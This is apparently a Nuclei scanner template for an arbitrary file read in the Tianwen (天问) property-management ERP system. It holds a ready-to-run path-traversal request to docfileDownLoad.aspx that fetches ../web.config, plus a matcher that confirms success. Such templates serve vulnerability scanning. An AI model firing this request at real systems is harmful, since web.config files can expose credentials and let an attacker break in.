id: tianwen-erp-docfiledownload-fileread

info:
  name: 天问物业ERP系统 docfileDownLoad.aspx 任意文件读取
  author: SleepingBag945
  severity: medium
  reference:
  - https://github.com/wy876/POC/blob/39ff10907cdbdaa1c48f144ed0475c725fec21d3/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9FdocfileDownLoad.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1#L4

http:
- raw:
  - |+
    GET /HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config HTTP/1.1
    Host: {{Hostname}}

  matchers:
    - type: dsl
      dsl:
        - "contains_all(body_1, 'xml version','configuration') && status_code==200"
      condition: and